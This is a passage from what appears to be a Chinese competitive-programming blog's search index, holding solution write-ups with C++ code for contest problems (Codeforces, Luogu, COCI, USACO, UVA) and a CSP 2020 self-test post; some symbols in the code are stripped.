1,r,x,v); tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1]);//合并方式要注意","categories":["Solution"]},{"title":"题解：CF883M Quadcopter Competition","path":"/2021/05/09/CF883M/","content":"这是一道有关于直角坐标系的题目，手动算一下就可以找到规律。 不难道想到分类讨论，我们分三类（飞行器与旗子应该不会重叠）： $x_1 ≠ x_2$ 且 $y_1 ≠ y_2$。也就是样例给的图片，我们观察一下，发现比普通的求两点间的两倍曼哈顿距离又多了 $4$。所以此时的答案为 ${|x_1 - x_2| + |y_1 - y_2|} \\times 2 + 4$。 $x_1 ≠ x_2$ 且 $y_1 = y_2$。同样的，进行手推，发现这次是两倍曼哈顿距离又多了 $6$。所以此时的答案为 ${|x_1 - x_2|} \\times 2 + 6$。 $x_1 = x_2$ 且 $y_1 ≠ y_2$。与 $2$ 的情况的本质相同，也是两倍曼哈顿距离又多了 $6$。所以此时的答案为 ${|y_1 - y_2|} \\times 2 + 6$。 综上所述，我们可以得到代码： #include iostream#include cstdio#include cmathusing namespace std;inline int read ();int a,b,c,d;int main () a = read ();b = read ();c = read ();d = read (); if (a != c b != d) printf (%d ,2 * (abs (a - c) + abs (b - d)) + 4); if (a == c) printf (%d ,2 * abs (b - d) + 6); if (b == d) printf (%d ,2 * abs (a - c) + 6); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1505D Xenolith? Hippodrome?","path":"/2021/04/22/CF1505D/","content":"本题的题面十分简单，但是我们可以从数据范围中与样例中看出一些细节信息。 首先是 $1 \\le N \\le 1024,2 \\le M \\le 16$，从 $M$ 的数据范围中很容易联想到 $N$ 在 $M$ 进制下所表示的数。把样例中的数字进行转换，分别得到 $(2)_3,(11)_2,(21)_{16},(11)_5$。其中答案分别分别为 $\\texttt{YES,NO,YES,NO}$，因此大胆猜测根据是否有重复数字来判断(不得不说这需要很大的脑洞)。 因此最后有完整代码： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();bool re[20];int main () int a = read (),b = read (); while (a != 0) if (re[a % b]) puts (NO); return 0; re[a % b] = 1; a /= b; puts (YES); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7472 【[NOI Online 2021 入门组] 吃豆人（民间数据）】","path":"/2021/03/28/P7472/","content":"这道题大家可以先画画图，然后发现周围除四个角的任意一点出发，总能回到该点。因此我们可以只求出第一行开始遍历的求和答案，注意四角的两点需要特判！ 至于如何求一个环之和，我们就找规律。令一开始往右下的方向走，则不断碰壁更改的方向依次是：右下 - 左下 - 左上-右上。直到回到原位。这样我们把第一行全部遍历后就能分别得到每条路径对应的豆子数量之和。所以下一步我们需要找到两条不同的路径减去重复部分后的最大值。 以题目中的图为例，我们再次找规律，设选择的两条路径第一行的横坐标为 $x,y(x y)$，发现只有第一行两点间的距离为偶数时才可能出现交点。其次，易得两点距离为$y - x$ 则交点分别在任意一条路径与最大方框交点的向上、下、左、右的 $\\frac{y-x}{2}$ 的点上（感性理解一下，就是如下图二箭头所指的四个点)。 注意的是，重复需要减去的点也有可能会有重叠。因此，需要判断重复的点是否相同。这个判断用 if 就行，千万不要用什么 map 等去判断！！！ 最后发一下完整代码，没理解的看一下具体的实现： #include iostream#include cstdio#include algorithm#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e3 + 5;const int MOD = 1e9 + 7;inline int read ();int n,cnt,ans;int a[MAX][MAX],num[MAX];bool vis[MAX];void search (int x,int y,int st);int work (int x,int y);int main () freopen (pacman.in,r,stdin); freopen (pacman.out,w,stdout); n = read (); for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) a[i][j] = read (); for (int i = 1;i = n;++i) cnt = 0; if (i == 1) for (int j = 1;j = n;++j) cnt += a[j][j]; else if (i == n) for (int j = 1;j = n;++j) cnt += a[n - j + 1][j]; else search (1,i,1); num[i] = cnt; for (int i = 1;i = n;++i)//找到最优解 for (int j = i + 1;j = n;++j) ans = max (ans,work (i,j)); printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void search (int x,int y,int st) if (x == 1) if (vis[y]) return ;//回到原位 else vis[y] = 1; cnt += a[x][y];//累加 //不同方向 if (y == 1) st = 3; if (y == n) st = 2; if (x == n) st = 4; if (st == 1) search (x + 1,y + 1,st); if (st == 2) search (x + 1,y - 1,st); if (st == 3) search (x - 1,y + 1,st); if (st == 4) search (x - 1,y - 1,st);int work (int x,int y) int sum = num[x] + num[y],same = 0; if ((y - x) % 2 == 1) return sum;//没有交点的情况 int len = (y - x) / 2; same += a[len + 1][x + len];//判重复的方向，注意不要重复减去！！！不要用map if (x + len != len + 1) same += a[x + len][len + 1]; if ((n - x) + 1 - len != x + len n - len != 1 + len (n - x) + 1 - len != 1 + len n - len != x + len) same += a[(n - x) + 1 - len][n - len]; if ((n - x) + 1 - len != x + len n - len != 1 + len (n - x) + 1 - len != 1 + len n - len != x + len (n - x + 1) - len != n - len) same += a[n - len][(n - x) + 1 - len]; return sum - same;","categories":["Solution"]},{"title":"题解：P7411 [USACO21FEB] Comfortable Cows S","path":"/2021/03/13/P7411/","content":"就是一个深搜的过程，每次一头牛加入进来，做以下操作： 判断该位置是否已经有牛。若已经有牛，则说明之前的操作必须使该位置有牛才最优，因此此时可以将答案减去 $1$。 判断该位置是否满足题意。 判断该位置的四个相邻位置是否满足题意。 若有新加牛，则需重复步骤 $2,3$，判断新加牛的位置。 对于判断是否满足题意，只需判断该点周围牛的个数是否为 $3$。 bool check (int x,int y) if (!vis[x,y]) return 0;//若该点没有牛，则不用判断 int sum = 0; for (int i = 0;i 4;++i) int newx = x + dx[i],newy = y + dy[i]; if (vis[newx,newy]) ++sum; if (sum == 3) return 1;//刚好为三个 else return 0; 具体重复搜索的过程就是一个裸裸的 $\\texttt{dfs}$，写的和其它大佬的差不多，就不展示了。 至于题目中的“注意加入的奶牛的 $x$ 和 $y$ 坐标并不一定需要在范围 $0 \\ldots 1000$ 内。”，我是直接使用 STL 中 map，map pair int,int,bool vis; 来实现对负数的储存的。但是实测速度较慢，要吸氧才能过，因此较好的方法是对输入的坐标均加上一个较大的数，这样能够较好地避免新加的牛的坐标会出现负数的情况。","categories":["Solution"]},{"title":"题解：CF427C Checkposts","path":"/2021/02/19/CF427C/","content":"由题可以知道，每一条边都是有向边。一个检查站只能保护一个环上的路口，即检查站的个数也是环的个数。 题目的第一问求最小花费，也就是就每个环上建一个检查站的最小花费之和。因此用 tarjan 求出每一个强联通分量以及该分量内的最小花费，最后求一个和。 void tarjan (int u)//模板即可 low[u] = dfn[u] = ++times; s.push (u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v); low[u] = min (low[u],low[v]); else if (!scc[v]) low[u] = min (low[u],dfn[v]); if (low[u] == dfn[u]) ++scc_cnt; while (true) int x = s.top (); s.pop (); scc[x] = scc_cnt; mn[scc_cnt] = min (mn[scc_cnt],cost[x]);//求最小值 if (x == u) break; 最后相加时注意最小花费是不用取模的，所以答案为 $\\sum^{n}_{i = 1} mn[i]$。 再来看第二问，求方案数。由于肯定要做到每一个强连通分量中选的检查站花费一定最优，所以只要求每一个分量中花费为 $mn[i]$ 的个数，然后根据乘法原理将它乘起来即可。注意这是需要取模的，答案为 $\\prod^{n}_{i = 1} num[i]$。 for (int i = 1;i = n;++i) if (cost[i] == mn[scc[i]]) ++num[scc[i]];//计数for (int i = 1;i = scc_cnt;++i) ans_cnt = (ll)ans_cnt * num[i] % MOD;//乘法原理","categories":["Solution"]},{"title":"题解：P7304 [COCI2018-2019#1] Zamjena","path":"/2021/02/11/P7304/","content":"一道并查集的题目，实现的时候细节较多。 【注： 以下 fa 与 num 数组的 $1 \\sim n$ 存第一个数组， $n + 1 \\sim 2n$ 存第二个数组。】因为与字符有关系，所以可以用 map 来记录每一个变量/数字所出现的第一个位置并标记 fa[i] = i。 if (num[a[i]] != 0) fa[i] = num[a[i]]; else fa[i] = num[a[i]] = i; 接下来就要以 $O(n)$ 的时间复杂度依次判断每个数组的第 $i$ 位是否符合要求了。这里需要进行分类讨论，有以下几种情况 (设两个数组分别为 a 与 b，find (int x) 为找到 $x$ 的父亲)： $a_i$ 与 $b_i$ 均为常量 直接比较是否相等即可 $a_i$ 为常量， $b_i$ 为变量 2.1. $b_i$ 的值已经确定 比较是否相等2.2. $b_i$ 的值未确定 fa[find (b[i])) = find (a[i]) $a_i$ 为变量， $b_i$ 为常量 3.1. $a_i$ 的值已经确定 比较是否相等3.2. $a_i$ 的值未确定 fa[find (a[i])) = find (b[i]) $a_i$ 与 $b_i$ 均为变量 4.1. $a_i$ 与 $b_i$ 均已经确定 比较是否相等4.2. 只有 $a_i$ 已经确定 fa[find (b[i])) = find (a[i])4.3. 只有 $b_i$ 已经确定 fa[find (a[i])) = find (b[i])4.4. $a_i$ 与 $b_i$ 均未确定 随便选一个作为父亲，进行合并 于是就有代码： bool correct (int x) //bool isnumber[MAX 1],isok[MAX 1];//是否是数字；是否已确定 int dx = find (num[a[x]]),dy = find (num[b[x]]); if (isnumber[x] isnumber[x + n]) if (a[x] != b[x]) return 0; else return 1; else if (isnumber[x]) if (dx == dy) isok[dx] = 1;return 1; else if (!isok[dy]) fa[dy] = dx,isok[dy] = 1; else return 0; else if (isnumber[x + n]) if (dx == dy) isok[dx] = 1;return 1; else if (!isok[dx]) fa[dx] = dy,isok[dx] = 1; else return 0; else if (!isok[dx] !isok[dy]) fa[dx] = dy; else if (!isok[dx]) fa[dx] = dy,isok[dx] = 1; else if (!isok[dy]) fa[dy] = dx,isok[dy] = 1; else if (dx != dy) return 0; return 1; 最后若所有返回值都是 1，则符合题意；否则就是不符合。","categories":["Solution"]},{"title":"题解：P7338 『MdOI R4』Color","path":"/2021/02/10/P7338/","content":"这是一道不错的贪心题目，同时也考察了选手们的读题仔细程度。先给出几个关键点： 只能对两个相邻且均为白色的格子进行染色，也就是说染色是不能够覆盖的 对于输入中的 1 的位置一定要为红色，其余位置随意。 以某行的第 $i$ 列 ($1 \\le i \\le n$)为基准，若所在的两个格子均存在，则有可能的三种染法： $p_i$ 与 $q_i$ $p/q_i$ 与 $p/q_{i - 1}$ $p/q_i$ 与 $p/q_{i + 1}$ 这其中有一个贪心的顺序，若调换可能会出现错误。想要去进行最优的染色一定是按照 $2\\to 1 \\to 3$ 的顺序才能充分利用所有的白色格子。想通这个后，接下去就是一些细节的实现了。 n = read ();scanf (%s%s,da,db);ok = 1;for(register int i = 0;i = n;++i) ca[i] = cb[i] = 0;//注意一下，不要用 memset 会超时哦//0 white 1 red 2 bluefor (register int i = 0;i n;++i) if (da[i] == 1)//第一行的第 i 块需要被染色 if (ca[i] == 1) ;//已经被染成目标色 //注意要两个格子均存在且均为白色才能染 else if (!ca[i - 1] !ca[i] i = 1) ca[i - 1] = 2,ca[i] = 1;//2 else if (!ca[i] !cb[i] db[i] == 0) ca[i] = 1,cb[i] = 2;//1，这里要注意若两行均为 1 则不能进行此操作，否则不是最优方法/无法成功染色 else if (!ca[i + 1] !ca[i] da[i + 1] == 0 i n - 1) ca[i] = 1,ca[i + 1] = 2;//3 else ok = 0;break;//无法实现 if (db[i] == 1)//第二行的第 i 块需要被染色 if (cb[i] == 1) ; else if (!cb[i - 1] !cb[i] i = 1) cb[i - 1] = 2,cb[i] = 1; else if (!ca[i] !cb[i] da[i] == 0) ca[i] = 2,cb[i] = 1; else if (!cb[i + 1] !cb[i] db[i + 1] == 0 i n - 1) cb[i] = 1,cb[i + 1] = 2; else ok = 0;break; if (ok) printf (RP );else printf (++ );","categories":["Solution"]},{"title":"题解：P7305 [COCI2018-2019#1] Cipele","path":"/2021/02/08/P7305/","content":"这是一道练习二分的不错的题目。因为每组数据的答案的范围都可以被算出来，所以就可以对答案进行二分然后判断该答案是否合法即可，这样时间复杂度也会降到 $\\log$ 级别，所以不会超时。 先来看看如何求答案的范围。为了方便程序的计算，以下保证 $n \\le m$ (若出现 $n m$ 的情况，则输入完毕后将 $n,m$ 以及 $L_i,R_i$ 进行交换)。对于所有左脚鞋 $L_i$ 都有一个右脚鞋 $R_i$ 满足 $L_i = R_i$ 的情况，则最小的答案为 $0$；将左右脚鞋子分别进行排序，由题对丑陋度的定义可知，最大的答案为 $\\min (|L[1] - R[m]|,|R[1] - L[n]|)$。 得知范围后，接下来就是对答案的二分了。二分目的是要找到一个最小的合法答案，因此要写成 r = mid 与 l = mid + 1。 while (l r) int mid = (l + r) 1; if (check (mid)) r = mid; else l = mid + 1; 那么如何判断解是否合法呢？设当前的待判断的答案为 $num$，用数量较少的鞋子去匹配数量较多的鞋子(由于前文规定了 $n m$，也就是用左脚鞋去匹配右脚鞋)，利用贪心的思想，对于每一只已经从小到大排好的左脚鞋，要找到一只右脚鞋满足 $|L_i - R_j| \\le num$ 后再去匹配下一只左脚鞋。若在左脚鞋满足在范围内全部成功与右脚鞋匹配的情况，则答案合法，否则不合法。 bool check (int num)//to check whether the answer is correct or not int cnt = 1; for (int i = 1;i = n;++i) while (cnt = m abs (a[i] - b[cnt]) num) ++cnt;//plus cnt until find a correct answer if (cnt m) return 0; ++cnt;//find it return 1; 最后退出循环 while (l r) 后得到的 $l$ 就是答案啦！","categories":["Solution"]},{"title":"题解：P7258 [COCI2009-2010#3] SLATKISI","path":"/2021/01/31/P7258/","content":"这道题目的本质还是对于四舍五入的理解。 对于一个位上的数 $x$，若 $0 \\le x \\le 4$，则会舍到 $0$；若 $5 \\le x \\le 9$，则会进一位到 $10$。而题目中的零数 $k$ 为 $0-9$，分别代表个、十、百 $\\cdots$。 因此可以为一个数的一半为界进行判断，四舍只要抹去余数，五入则需加上除余数不足的部分，代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;ll read ();ll a[15] = 1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9;//先存入题目中的数int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); ll c = read (); ll k = read (); if (c % a[k] (a[k] 1)) printf (%d ,c - c % a[k]);//减去余数 else printf (%d ,c - c % a[k] + a[k]);//加上剩余部分 return 0;ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7190 [COCI2007-2008#6] SEMAFORI","path":"/2021/01/23/P7190/","content":"由题可知路程所花费的时间一定为 $l$，所以我们要计算的便是等待红灯所花费的时间。 Luka 开始开车时，所有交通信号灯都呈红色，并且开始循环。 信号灯将按 $d$ 升序排列。 这两句话是本题的关键。因为有序读入红绿灯的距离，所以只要从 $1$ 至 $n$ 顺次枚举。由题意知每个红绿灯的周期为 $g_i + r_i$，所以每到一个路口时，判断当前的状况，若为红灯，则在答案中加上等红灯的时间，并会影响下一次的情况判断。 给下代码： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 150;const int MOD = 1e9 + 7;ll read ();int n,m,ans; struct traffic int s,r,g; a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i].s = read (); a[i].r = read (); a[i].g = read (); for (int i = 1;i = n;++i) ans += a[i].s - a[i - 1].s;//路程距离 int rest = ans % (a[i].r + a[i].g);//留下单个周期的不完整部分 if (rest a[i].r) ans += a[i].r - rest;//等待红灯的时间 printf (%d ,ans + (m - a[n].s));//最后的路程不能忘 return 0;ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7273 ix35 的等差数列","path":"/2021/01/16/P7273/","content":"枚举公差，因为 $1 \\le a_i \\le w$，所以易得公差 $d \\le \\frac{w}{n}$。 接下来枚举数列的第一个数为 $k$，则我们可以表示出该数列的第 $i$ 项为 $k + d \\times (i - 1)$。因为数列的项数与公差不变，即 $a_i$ 所对应的 $k$ 是唯一的(只有一个 $k$ 符合条件)，所以我们可以处理出当 $k$ 为第一项时，数列中有多少个数不需要被修改。根据刚刚表示的数列中第 $i$ 项的数，可以得到 $a_i$ 所对应的 $k$ 为 $a_i - d \\times (i - 1)$。 一个需要注意的条件就是修改后每个数的范围是 $1 \\le a_i \\le w$，这个需要体现在你的程序中，同时还要注意一下数据类型(可能处理时会爆 int)。 最后给一个代码吧： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const ll MAX = 3e5 + 5;const ll MOD = 1e9 + 7;ll read ();ll a[MAX],b[MAX];ll n,m,ans,num,s;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (ll i = 1;i = n;++i) a[i] = read (); ans = n - 1;//最大值 for (int num = 0;num = m / n;++num) init (b);s = 0; ++b[a[1]];//第一项别忘了处理 for (ll i = 2;i = n;++i) ll tmp = a[i] - (i - 1) * num; if (tmp = 0 || tmp + (n - i) * num m) continue;//不符合的情况 ++b[tmp];//当第一项为 a[i] - (i - 1) * num 时，第 i 项不需要修改 s = max (b[tmp],s); ans = min (ans,n - s); printf (%lld ,ans); return 0;ll read () ll s = 0;ll f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：[ABC113B] Palace","path":"/2021/01/09/ABC113B/","content":"题目的大意便是找到 $|T - h_i \\times 6 \\times 10^{-3} - A|$ 为最小值的下标并输出 $i$。 因此我们先将这个值设为 0x3f3f3f3f，即正无穷，然后每次输入进行一次比较，若比原答案更优，则将其进行更新，并记录下标。最后输出下标即可，时间复杂度为 $O(n)$。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;ll read ();int n,t,A,ans;double sum = INF; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();t = read ();A = read (); for (int i = 1;i = n;++i) int x;x = read (); if (sum abs (t - x * 0.006 - A)) ans = i,sum = abs (t - x * 0.006 - A);//compare printf (%d ,ans); return 0;ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7243 最大公约数","path":"/2021/01/03/P7243/","content":"对于 $a_{x,y}$，一共有三种情况，分别列举一下： 初始值为 $1$。 此时不需要经过变换，直接输出 $0$。 经过若干次变换都不会变为 $1$。 这种情况显然输出 $-1$。但是该如何判断它呢？ 考虑一下，在 $n \\times m$ 的方阵中，若有两个数 $a_{x_1,y_1}$ 与 $a_{x_2,y_2}$ 满足 $\\gcd(a_{x_1,y_1},a_{x_2,y_2}) = 1$，那么经过若干次的变换后一定能使所有的位置上的数变为 $1$。 在一次变换后的相关的 $5$ 个位置，都会变为 $1$ 或者是它们中的某一个数。也就是说以每个点为中心的 $5$ 个位置都会改变。因此上述的情况是成立的。 也就是把该方阵中的所有数做一遍 $\\gcd$，若答案不为 $-1$，也就是无解的标志。 在有限次数内能变为 $1$。 首先考虑暴力，模拟每一次的变换过程，大概能拿到 $45\\texttt{Pts}$ 的好成绩。 看回到情况 $2$，随手拿几个样例推一下，发现若 $\\gcd(a_{x,y},a_{x’,y’}) = 1$，需要 $|x - x’| + |y - y’|$ 次后才能变换为 $1$。这不就是曼哈顿距离嘛，这样也就好写了。 最后放一个伪代码，同时也祝大家在 $2021$ 年中 $\\texttt{rp++}$。 int main () for (int i = 1;i = n;++i)//n * m 的一遍 gcd for (int j = 1;j = m;++j) if (i == 1 j == 1) all = a[i][j]; else all = work (all,a[i][j]); if (all != 1)//特判 printf (-1 ); return 0; if (a[x][y] == 1)//特判 printf (0 ); return 0; for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i == x j == y) continue;//起点位置 if (abs (x - i) + abs(y - j) = ans) continue;//一个小优化 if (work (a[i][j],a[x][y]) == 1) ans = min (ans,abs (x - i) + abs(y - j)); printf (%lld ,ans); return 0;ll work (ll x,ll y)//辗转相除 return (y == 0 ? x : work (y,x % y));","categories":["Solution"]},{"title":"题解：P4171 [JSOI2010]满汉全席","path":"/2020/12/12/P4171/","content":"说白了，这就是一个 $\\texttt{2-SAT}$ 的模板题，大致可以分成三个部分。 首先是对于数据的处理。每一个评审员的输入都是两个字符串，而每个字符串都是由字母 $h/m$ 再加上材料编号组成的。因此只需要将其用 %s 读入后分开处理就行了。 然后就是建图的过程。我们可以把汉与满分别看成 $0$ 和 $1$，然后根据两个条件只要满足其一(也就是或)的原则进行建图。举个例子，若 $a,b$ 两个数的值均为 $1$，也就是说 $a,b$ 至少有一个数的值为 $1$。所以我们可以确定建出的两条边是 $a = 0$ 推出 $b = 1$ 与 $b = 0$ 推出 $a = 1$。 最后就是使用 $\\texttt{tarjan}$ 算法求出强连通分量，然后判断在一个强连通分量中是否存在一种材料的值既有 $0$ 又有 $1$。若出现这种状态，就说明该材料既需要做成汉式，也需要做成满式，因此条件存在矛盾，所以这种情况要输出的是 BAD；否则输出 GOOD。 代码如下： #include iostream#include cstdio#include stack#include cstring#define init(x) memset (x,0,sizeof (x))using namespace std;const int MAX = 1e3 + 5;stack int s;bool ok;int n,m,t,cnt,times,scc_cnt;int head[MAX 1],nxt[MAX 1],to[MAX 1],dfn[MAX 1],low[MAX 1],scc[MAX 1];void pre ();void build (int num1,bool ty1,int num2,bool ty2);void _add (int u,int v);void tarjan (int u);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%d,t); while (t--) pre ();//初始化很重要 scanf (%d%d,n,m); //汉 0 满 1 for (int i = 1;i = m;++i) char da[1000],db[1000]; int a = 0,b,c = 0,d; scanf (%s %s,da,db); if (da[0] == h) b = 0; else b = 1; if (db[0] == h) d = 0; else d = 1; for (int i = 1;i strlen (da);++i) a = a * 10 + da[i] - 0; for (int i = 1;i strlen (db);++i) c = c * 10 + db[i] - 0; build (a,b,c,d); for (int i = 1;i = 2 * n;++i) if (!dfn[i]) tarjan (i); for (int i = 1;i = n;++i)//是否存在矛盾 if (scc[i] == scc[i + n]) ok = 0; break; if (ok) puts (GOOD); else puts (BAD); return 0;void pre () cnt = times = scc_cnt = 0; ok = 1; init (head);init (nxt);init (to); init (dfn);init (low);init (scc);void build (int num1,bool ty1,int num2,bool ty2)//建图过程 if (!ty1 !ty2)// the first one is false or the second one is false _add (num1,num2 + n);// we know the first one is true so we can infer the second one is false _add (num2,num1 + n); if (!ty1 ty2)// the first one is false or the second one is true _add (num1,num2);// we know the first one is true so we can infer the second one is true _add (num2 + n,num1 + n); if (ty1 !ty2)// the first one is true or the second one is false _add (num1 + n,num2 + n);// we know the first one is false so we can infer the second one is false _add (num2,num1); if (ty1 ty2)// the first one is true or the second one is true _add (num1 + n,num2);// we know the first one is false so we can infer the second one is true _add (num2 + n,num1); void _add (int u,int v)//连边 to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void tarjan (int u)//强连通分量 dfn[u] = low[u] = ++times; s.push (u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v); low[u] = min (low[u],low[v]); else if (!scc[v]) low[u] = min (low[u],dfn[v]); if (low[u] == dfn[u]) ++scc_cnt; while (1) int x = s.top (); s.pop (); scc[x] = scc_cnt; if (x == u) break;","categories":["Solution"]},{"title":"题解：UVA1401 Remember the Word","path":"/2020/11/20/UVA1401/","content":"这道题所用的算法是 $\\texttt{Trie + DP}$。 我们设 $dp[i]$ 表示长单词 $S$ 的前 $i$ 个长度的方案数，则有(保证 $S_{j\\cdots i}$ 是一个单词)： dp[i] = dp[i] + \\sum_{j = 1}^{i - 1}dp[j]如果使用暴力进行两层循环，不用说肯定超时。由题可知只有 $26$ 个字母，因此可以把长单词 $S$ 建成一棵字典树，然后枚举起点位置，直到找到一个单词结点，便可以进行一次转移。 优化之后，因为题目中说每个单词长度不超过 $100$，因此最多搜索到深度为 $100$ 的结点上，因此不会超时了。给个代码： #include iostream#include cstdio#include cstring#define mod 20071027using namespace std;char sen[300005];int n,num; int ch[400005][26],tot,cnt[400005],dp[400005];//开大一点，防止 REstruct Trie void init ()//多组数据的初始化 tot = 0; memset (ch,-1,sizeof (ch)); memset (cnt,0,sizeof (cnt)); memset (dp,0,sizeof (dp)); void insert (char *str)//插入 int len = strlen (str),p = 0; for (int i = 0;i len;++i) if (ch[p][str[i] - a] == -1) ch[p][str[i] - a] = ++tot; p = ch[p][str[i] - a]; ++cnt[p]; void find (int x)//查找 int len = strlen (sen),p = 0; for (int i = x;i len;++i) if (ch[p][sen[i] - a] == -1) return ; p = ch[p][sen[i] - a]; if (cnt[p]) if (x - 1 0) dp[i] += 1;//相当于初始化 else dp[i] += dp[x - 1];//转移 dp[i] %= mod;//取模不能忘记 ;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); while (scanf (%s,sen) != EOF)//多组数据 ++num; Trie word; word.init (); scanf (%d,n); for (int i = 1;i = n;++i) char s[105];scanf (%s,s); word.insert (s); int len = strlen (sen); for (int i = 0;i len;++i) word.find (i);//从第 i 个开始查找 printf (Case %d: %d ,num,dp[len - 1]);//注意格式，本蒟蒻就在这里挂了几次 return 0;","categories":["Solution"]},{"title":"CSP 2020 场外篇","path":"/2020/11/07/CSP2020/","content":"前言坐标 $\\texttt{ZJ}$，初三蒟蒻。 初赛 $\\texttt{TG}$ 只有 $\\texttt{64pts}$，不幸没过初赛（成功退役，开始为中考淦 $\\texttt{whk}$）。所以只能作为场外选手，进行自测了。 普及篇$\\texttt{T1}$与二进制相关的一道题，一个数 $x$ 能被表示成 $2$ 的正整数次幂，因此一个数在二进制下的最后一位一定是 $0$，即为偶数时才能够被拆分。 对于一个偶数，从高位开始枚举 $k$，使得最小的 $k$ 满足 $2^k \\ge n$，然后 $n = n - 2^k$ 并记录 $2^k$，重复操作直到 $k = 0$。最后输出即可。 #include iostream#include cstdio#include cmathusing namespace std;int a[30],n,k,p; int main () freopen (power.in,r,stdin); freopen (power.out,w,stdout); int n; scanf (%d,n); p = pow (2,25); while (p 1 n) while (p n p 1) p = 1; if (n = p p 1) a[++k] = p,n -= p; if (n) printf (-1 ); else for (int i = 1;i = k;++i) printf (%d ,a[i]); puts (); return 0; $\\texttt{T2}$简单模拟，仔细读题注意一些细节就行 (比如循环范围，数据类型等)。 因为最大的点 $n = 10^5$，如果每次输入后都进行一次快排，最后可能超时。 考虑用一个数组 num[i] 记录不小于分数 $i$ 的人数。输入一个人的分数 $x$ 后，将会对数组 num[0-x] 分别产生 $1$ 的贡献，然后计算出当前获奖人数。 由题知每个选手的成绩均为不超过 $600$ 的非负整数，所以就可以从大到小枚举 num[i]，直到找到第一个 num[i] 满足不小于当前获奖人数后，输出并退出循环。 #include iostream#include cstdio#include cmathusing namespace std;int n,w,x,num[605];//num[i] means the number of people that the scores are equal or more than i int main () freopen (live.in,r,stdin); freopen (live.out,w,stdout); scanf (%d%d,n,w); for (int i = 1;i = n;++i) scanf (%d,x); for (int j = 0;j = x;++j) ++num[j]; int now = max ((double) 1,floor ((double) i * w / 100.0)); for (int j = 600;j = 0;--j) if (num[j] = now) printf (%d ,j); break; puts (); return 0; $\\texttt{T3}$这是一道模拟题，需要足够的耐心与细心。不过全输出 $0$ 或 $1$ 也可以获得一些分。(手动狗头) $\\texttt{30pts}$ 每一次询问都扫一遍后缀表达式进行计算，时间复杂度为 $O(q\\times |s|)$，没啥技术含量，所以其它的测试点全都 $\\texttt{TLE}$ 了。 $\\texttt{T4}$一看就是一道 $\\texttt{DP}$ 题目，从 $(1,1)$ 走到 $(n,m)$ 的最大价值，可以向右向下向上走。 先来看向右向下，这两个很好处理，状态转移方程如下： dp[i][j] = \\max (dp[i][j - 1],dp[i - 1][j]) + a[i][j]但是对于向上，如果在按之前的顺序转移，那么 $dp[i + 1][j]$ 的值就无法在得到 $dp[i][j]$ 之前得到了。改变一下策略先搜索列再搜索行，这样就能完美解决这个问题。然后把二位改成三位，一个从上开始，另一个从下开始。 需要注意的几点有： 初始化的问题，注意有负数存在。最边上的行与列可能需要特判去进行求解 边界需要着重考虑。 全部加在一起有可能会爆 int，因此要开 long long。 搜索的顺序与求解的顺序是相关的，一定要注意有无后效性。 #include iostream#include cstdio#include 